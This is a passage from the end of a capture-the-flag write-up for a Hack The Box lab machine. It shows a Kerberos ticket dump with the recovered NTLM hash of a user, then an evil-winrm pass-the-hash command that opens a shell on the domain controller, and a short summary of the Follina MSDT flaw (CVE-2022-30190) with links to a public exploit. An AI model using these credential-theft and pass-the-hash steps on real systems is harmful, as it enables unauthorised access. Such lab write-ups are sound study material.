      MDJaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi

  ServiceName              :  krbtgt/outdated.htb
  ServiceRealm             :  OUTDATED.HTB
  UserName                 :  SFLOWERS
  UserRealm                :  OUTDATED.HTB
  StartTime                :  10/12/2022 1:28:02 AM
  EndTime                  :  10/12/2022 11:28:02 AM
  RenewTill                :  10/19/2022 1:28:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  sN5DpS7kQepeI5tv5I/q+Q==
  ASREP (key)              :  03250DCA8CC8E9BA02485E8C847C76D3

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
\end{verbatim}
pas crackable mais on peut winrm maintenant en pass the hash
\begin{verbatim}
$ evil-winrm -i dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sflowers\Documents> exit
\end{verbatim}
\begin{verbatim}

\end{verbatim}

\subsubsection{x}



\begin{verbatim}

\end{verbatim}
\section{Theorie}

\subsection{Summary Of CVE-2022-30190}

This is a zero-click RCE vulnerability in MSDT. The flaw exists in ‘MSDT URL protocol’. Attackers can exploit this flaw just by calling MSDT using the URL protocol from a Microsoft Office application such as Word. Successful exploitation of this flaw allows attackers to run arbitrary code with the privileges of the calling application. The attacker can further use this vulnerability to install programs, view, change, delete data, or even create new accounts on the Windows machines. Huntress has published a detailed technical analysis of this flaw in its blog. Please go through it if you are querulous to know about the technical details.

\url{https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug}

\url{https://ethical.blue/textz/n/32}
\url{https://github.com/JohnHammond/msdt-follina}
